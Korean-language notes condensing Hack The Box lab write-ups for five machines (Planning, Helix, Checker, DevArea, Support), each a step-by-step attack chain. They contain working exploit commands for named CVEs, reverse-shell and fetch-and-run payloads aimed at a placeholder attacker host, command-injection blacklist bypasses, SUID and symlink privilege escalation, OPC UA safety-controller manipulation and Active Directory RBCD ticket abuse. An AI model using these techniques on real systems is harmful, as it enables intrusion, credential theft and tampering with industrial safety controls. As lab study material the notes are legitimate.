# HTB 라이트업 배치5 추출 기법

### Planning (Linux, Easy, 2025) 22 ssh / 80 nginx(planning.htb)  [Grafana 체인]
- planning.htb → /etc/hosts. ffuf -w bitquark-subdomains -H "Host: FUZZ.planning.htb" -u http://planning.htb -fs <기본크기>
  → grafana.planning.htb → /etc/hosts
- Grafana v11.0.0(Help 아이콘에 버전) 제공자격 admin:0D5oT70Fql3EvB5r → CVE-2024-9264
  (SQL Expressions 실험기능, DuckDB CLI 로 미정제 SQL → RCE+LFI, Viewer 권한 이상, API 로 접근가능)
  POC: python3 poc.py --url http://grafana.planning.htb --username admin --password <pw>
  --reverse-ip {atk} --reverse-port 9001 → nc -lvnp 9001 → Docker 컨테이너 root
- lateral: hostname=숫자(컨테이너). env → GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!, GF_SECURITY_ADMIN_USER=enzo
  → ssh enzo@planning.htb (비번 재사용) → user.txt
- privesc: netstat -tulnp → 내부 127.0.0.1:8000. ssh -L 8000:127.0.0.1:8000 enzo@{t}
  /opt/crontabs/crontab.db → cat → 평문비번 P4ssw0rdS0pRi0T3c + root 실행 cron
  → 127.0.0.1:8000 Crontab UI 로그인(root:P4ssw0rdS0pRi0T3c)
  → New cron: command="chmod u+s /bin/bash" → Run now → enzo 터미널에서 bash -p → root → /root/root.txt
- 교훈: ffuf vhost. 앱 버전→CVE(Grafana 9264). Docker env 자격(GF_SECURITY_*). 내부포트 ssh -L.
  crontab.db 평문자격. root cron 작성 → SUID bash(chmod u+s) → bash -p.

### Helix (Linux, Medium, ICS/OT, 2026) 22 ssh / 80 nginx(helix.htb)
- helix.htb → /etc/hosts. ffuf -H "Host: FUZZ.helix.htb" -fs 154 → flow.helix.htb → Apache NiFi 1.21.0
- Apache NiFi processor RCE: msf use exploit/multi/http/apache_nifi_processor_rce; set vhost flow.helix.htb
  set RHOSTS http://{t}; set LHOST {atk}; run → nifi 서비스계정 셸(/opt/nifi-1.21.0)
- lateral: support-bundles/ 에 operator_id_ed25519.bak(SSH 개인키) → chmod 600; ssh -i key operator@helix.htb
  → /home/operator/user.txt
- privesc(ICS/OT): operator 홈의 'control systems diagram.png' + 'Operator Control & Safety Guide.pdf'(암호보호)
  pdf2john guide.pdf > hash; john -w rockyou → operator1 → PDF 열람(제어논리 규칙)
  내부 OPC UA opc.tcp://127.0.0.1:4840/helix, HMI 8081. ss -tnlp 확인 → ssh -L 8081/4840 포워딩
  sudo -l → (root)NOPASSWD /usr/local/sbin/helix-maint-console (안전컨트롤러 유지보수 창에서만 동작)
- OPC UA 조작(python asyncua): 쓰기가능 노드 Control.Mode, Control.TestOverride, Reactor.CalibrationOffset
  (UserAccessLevel bit 0x02=write 확인). Mode=MAINTENANCE + TestOverride=True → CalibrationOffset 적용됨
  CalibrationOffset 소폭 램프 → 온도를 창 밴드(>=295C)로, 트립(>=305C) 미만 유지 → 안전컨트롤러가 유지보수 창 개방
  → sudo /usr/local/sbin/helix-maint-console → root → /root/root.txt (창 ~115초 제한, 즉시 실행)
- 교훈: Apache NiFi=processor RCE(msf). 진단번들/백업에 SSH키. pdf2john. ICS/OT=OPC UA(asyncua) 노드 쓰기권한
  확인(0x02), 제어논리 이해해 안전상태 유도(메모리커럽션 아님). 내부 OPC UA/HMI 는 ssh -L.

### Checker (Linux, Hard, 2025) 22 ssh / 80 BookStack(checker.htb) / 8080 Teampass  [RE/바이너리]
- checker.htb → /etc/hosts. 80=BookStack v23.10.2(소스 meta version). 8080=Teampass
- Teampass <3.0.0.22 → CVE-2023-1545 SQLi: teampass_cve.sh http://{t}:8080 → admin/bob bcrypt 해시
  hashcat -a0 -m3200 hashes rockyou → bob:cheerleader → Teampass 로그인
  bob-access 폴더: bookstack login(bob:mYSeCr3T_w1kI_P4sSw0rD) + ssh access(reader:hiccup-publicly-genesis)
- ssh reader → 2FA(verification code) 필요. BookStack 23.10.2 → CVE-2023-6199(Blind SSRF/로컬파일읽기,
  /ajax/page/<id>/save-draft html 파라미터, php_filter_chains_oracle_exploit). requestor.py 를 base64 img 태그로 수정
  → /etc/passwd, 그다음 /backup/home_backup/home/reader/.google_authenticator(2FA 시크릿) 유출
- oathtool --totp -b <시크릿> → OTP → ssh reader@{t} (비번+OTP) → user.txt
- privesc: sudo -l → (root)NOPASSWD /opt/hash-checker/check-leak.sh *. 스크립트가 check_leak 바이너리 호출
  Ghidra RE: check_leak 가 teampass DB 해시 조회→leaked_hashes.txt 대조→유출시 "Leaked hash detected at TIME > HASH"
  를 공유메모리(shmget mode 0666=전역rw)에 기록, sleep 1, notify_user 가 '>' 이후를 추출해
  mysql -e 'select email from teampass_users where pw="%s"' 로 사용(명령주입 가능, \! 이스케이프)
- 공유메모리 레이스 명령주입: C exploit 로 pipe 에서 shm key 캡처→notify_user 읽기 전에 악성 페이로드 append
  payload: " or 1=1; \! /bin/sh -c "cp /bin/bash /home/reader/.bash && chmod 4755 /home/reader/.bash"; #
  터미널1: sudo /opt/hash-checker/check-leak.sh bob > pipe ; 터미널2: cat pipe | ./exploit '<payload>'
  → SUID /home/reader/.bash → /home/reader/.bash -p → root → /root/root.txt
- 교훈: Teampass CVE-2023-1545, BookStack CVE-2023-6199(PHP filter chains oracle 블라인드 파일읽기).
  2FA=.google_authenticator 시크릿+oathtool --totp 우회. 바이너리 RE(Ghidra). 공유메모리 0666 레이스.
  mysql -e 의 \! 는 셸 이스케이프(명령주입).

### DevArea (Linux, Medium, 2026) 21 ftp(anon) / 22 ssh / 80 Apache(devarea.htb) / 8080 Jetty(SOAP) / 8888 Hoverfly
- ftp anon → pub/employee-service.jar → jd-gui 디컴파일 → Java SOAP(Apache CXF+JAX-WS), /employeeservice?wsdl
  submitReport(Report{confidential,content,department,employeeName}). pom.xml: Apache CXF 3.2.14 + Aegis databinding
- CVE-2024-28752(Aegis SSRF, XOP Include): SOAP content 에 <xop:Include href="file:///etc/hosts"/> (multipart/related, type=xop+xml)
  → 응답에 base64 로 로컬파일 노출(임의 파일읽기)
- /proc/<PID>/cmdline 순회(xop_extractor.sh, PID 1..2000) → 프로세스 인자의 평문자격 수집
  → Hoverfly: hoverfly -add -username admin -password O7IJ27MyyXiU → Hoverfly Admin UI(8888) v1.11.3
- CVE-2025-54123(Hoverfly 미들웨어 명령주입): TOKEN=$(curl -XPOST http://{t}:8888/api/token-auth -d '{"username":"admin","password":"..."}'|jq -r .token)
  curl -XPUT http://{t}:8888/api/v2/hoverfly/middleware -H "Authorization: Bearer $TOKEN"
  -d '{"binary":"/bin/bash","script":"bash -i >& /dev/tcp/{atk}/4444 0>&1"}' → dev_ryan 셸 → user.txt
- lateral: ~/syswatch-v1.zip 소스. netstat -lputn → 127.0.0.1:7777 SysWatch(Flask). ssh -L 7777 포워딩
  setup.sh 가 /etc/syswatch.env 를 chmod 755(전역읽기) → SYSWATCH_SECRET_KEY=f3ac... 노출(Flask 서명키)
- Flask 세션 위조: itsdangerous URLSafeTimedSerializer(SECRET, salt='cookie-session', TaggedJSONSerializer,
  signer_kwargs={key_derivation:hmac, digest_method:sha1}).dumps({"user_id":1,"username":"admin"})
  → session 쿠키 교체 → admin 대시보드
- 명령주입(블랙리스트 우회): Service Status 가 subprocess.run(f"systemctl status --no-pager {service}", shell=True)
  SAFE_SERVICE 블랙리스트(; / & . < > 개행 대문자 차단) but | 허용 → ssh|id 로 syswatch RCE
  / 재구성: $(eval "echo \$$(echo path|awk '{print toupper($0)}')")|awk '{print substr($0,1,1)}' ($PATH 첫글자=/)
  . 재구성: touch app.py; ls|head -n1|awk '{print substr($0,4,1)}'  → curl http://{atk}/shell|bash 조립 → syswatch 셸
- privesc: sudo -l → (root)NOPASSWD /opt/syswatch/syswatch.sh (web-stop/web-restart만 차단). plugin/logs 서브커맨드
  logs 읽기가 root 로 syswatch 소유 logs 디렉토리 파일 cat. syswatch 가 logs 에 쓰기가능 → 심볼릭링크 공격
  view_logs() 가 즉시 타깃만 검사(SAFE_LOG_REGEX, /·..·\ 차단, logs 내 평문파일명만 허용) → 재귀적 미해결
  심볼릭 체인: ln -s /root/root.txt test.log; ln -sf test.log disk.log (검사는 disk.log->test.log 만 봄=통과)
  → sudo syswatch.sh logs disk.log → 체인 따라 /root/root.txt 노출. 동일하게 /root/.ssh/id_ed25519 유출
  → chmod 600; ssh -i key root@127.0.0.1 → root
- 교훈: Apache CXF Aegis=XOP SSRF(file://). /proc/PID/cmdline=인자 자격. Hoverfly CVE-2025-54123.
  world-readable env→Flask SECRET→세션 위조(itsdangerous). 블랙리스트 명령주입은 |·${IFS}·$PATH·awk 로 문자 재구성.
  심볼릭 체인(검사 1홉만)→루트실행 reader 로 민감파일 유출.

### Support (Windows AD, Easy, 2022) DC support.htb (LDAP 389/636, SMB 445, WinRM 5985)
- smbclient -L //{t}/ (익명) → support-tools 공유. smbclient //{t}/support-tools → get UserInfo.exe.zip → unzip
  UserInfo.exe = .NET(Mono/.Net) assembly. file 로 확인
- .NET RE: ILSpy(AvaloniaILSpy, Linux) 또는 dnSpy 로 디컴파일 → LdapQuery() 가 Protected.getPassword() 사용
  Protected: enc_password(base64) XOR key="armando"(바이트순환) XOR 0xDF → 복호화
  python: for e,k in zip(b64decode(enc), cycle(b"armando")): res+=chr(e^k^223) → ldap bind 비번
  (대안: Wireshark tun0 캡처 → LDAP bindRequest > authentication simple = support\ldap:비번)
- ldapsearch -h support.htb -D ldap@support.htb -w '<pw>' -b "dc=support,dc=htb" "*" (또는 Apache Directory Studio)
  → CN=Users → user "support" 의 info 필드 = Ironside47pleasure40Watchful (비표준 필드에 비번)
  support ∈ Remote Management Users → evil-winrm -i {t} -u support -p 'Ironside47pleasure40Watchful' → user.txt
- privesc(GenericAll→RBCD): SharpHound.exe → BloodHound → Shared Support Accounts 그룹이 DC 에 GenericAll
  (support 가 멤버). 전제: ms-DS-MachineAccountQuota=10(Get-ADObject), Authenticated Users, WRITE on DC
  1) Powermad: . ./Powermad.ps1; New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
  2) Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01 (msDS-AllowedToActOnBehalfOfOtherIdentity 설정)
  3) Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb → rc4_hmac
  4) Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
     → base64(ticket.kirbi) → base64 -d > ticket.kirbi → ticketConverter.py ticket.kirbi ticket.ccache
  → export KRB5CCNAME; impacket-wmiexec/psexec -k -no-pass administrator@dc.support.htb → NT Authority\System → root.txt
- 교훈: SMB 공유의 커스텀 .NET exe 는 ILSpy/dnSpy 로 RE(하드코딩 자격/XOR). LDAP 자격은 Wireshark bind 스니핑도.
  LDAP info/description 비표준 필드에 비번. GenericAll on computer = RBCD(Powermad New-MachineAccount +
  Set-ADComputer -PrincipalsAllowedToDelegateToAccount + Rubeus s4u -impersonate Administrator -ptt).
  전제 ms-DS-MachineAccountQuota>0. (rbcd.py/impacket 로도 가능)
